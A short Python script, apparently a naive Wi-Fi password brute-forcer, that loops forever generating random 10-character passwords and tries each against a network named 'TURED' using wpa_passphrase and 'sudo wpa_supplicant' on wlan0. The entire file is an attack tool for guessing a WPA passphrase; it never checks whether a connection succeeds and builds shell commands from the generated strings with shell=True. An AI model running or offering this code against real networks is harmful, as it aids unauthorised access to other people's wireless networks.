import random
import os
import subprocess

caracteres = "abcdefghijklmnñopqrstuvwxyz0123456789ABCDEFGHIJKLMNÑOPQRSTUVWXYZ"


while True:
    passwd=""

    for i in range(10):
        passwd += caracteres[random.randrange(len(caracteres))]

    print(passwd)


    print(subprocess.call("wpa_passphrase TURED {} > red.conf".format(passwd),shell=True))
    print(subprocess.call(" sudo wpa_supplicant -B -i wlan0  -c red.conf ".format(passwd),shell=True))